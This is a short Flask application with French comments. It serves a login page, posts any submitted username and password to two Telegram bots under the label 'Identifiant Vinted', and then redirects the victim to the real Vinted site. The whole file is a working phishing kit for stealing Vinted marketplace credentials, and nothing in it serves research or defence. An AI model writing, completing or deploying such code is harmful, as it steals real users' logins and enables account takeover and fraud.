from flask import Flask, request, redirect, render_template
import os
import requests
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# Premier bot
TELEGRAM_BOT_TOKEN_1 = os.getenv("BOT_TOKEN_1")
CHAT_ID_1 = os.getenv("CHAT_ID_1")

# Deuxième bot
TELEGRAM_BOT_TOKEN_2 = os.getenv("BOT_TOKEN_2")
CHAT_ID_2 = os.getenv("CHAT_ID_2")


def send_telegram_message(message):
    # Envoie via le premier bot
    url1 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_1}/sendMessage"
    data1 = {"chat_id": CHAT_ID_1, "text": message}
    requests.post(url1, data=data1)

    # Envoie via le deuxième bot
    url2 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_2}/sendMessage"
    data2 = {"chat_id": CHAT_ID_2, "text": message}
    requests.post(url2, data=data2)


@app.route("/", methods=["GET"])
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # Envoie à Telegram
    send_telegram_message(f"[ Idenfiant Vinted ] 👤 {username} | 🔑 {password}")

    # Redirige vers Vinted
    return redirect("https://www.vinted.fr")


if __name__ == "__main__":
    app.run(debug=True)
